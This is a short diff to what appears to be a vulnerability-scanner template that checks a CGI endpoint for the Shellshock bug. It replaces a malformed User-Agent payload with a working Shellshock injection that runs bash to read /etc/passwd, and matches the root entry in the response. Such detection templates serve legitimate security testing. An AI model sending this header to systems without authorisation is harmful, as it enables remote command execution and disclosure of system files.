@@ -8,12 +8,11 @@ info:
 requests:
  - method: GET
    headers:
-    User-Agent: "{ :;}; echo $(</etc/passwd)"
+    User-Agent: "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'"
    path:
     - "{{BaseURL}}/cgi-bin/status"
    matchers:
-    - type: word
-      words:
-       - "/bin/sh"
-       - "/bin/bash"
+    - type: regex
+      regex:
+       - "root:[x*]:0:0"
       part: body
